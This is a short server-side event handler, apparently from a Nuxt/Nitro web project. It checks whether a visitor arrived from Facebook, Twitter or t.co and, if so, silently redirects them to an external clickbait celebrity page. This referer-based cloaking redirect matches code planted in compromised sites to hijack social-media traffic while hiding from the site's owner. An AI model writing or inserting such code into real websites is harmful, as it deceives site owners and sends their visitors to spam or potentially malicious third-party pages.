export default defineEventHandler((event) => {
    const headers = event.req.headers;
    
    if (headers.referer && /facebook\.com|twitter\.com|t\.co/gi.test(headers.referer)) {
        sendRedirect(event,"https://zooms.wiki/sexy-kylie-jenners-skin-skimpy-pics-in-a-plunging-corset-will-make-you-sweat/");
    }
})
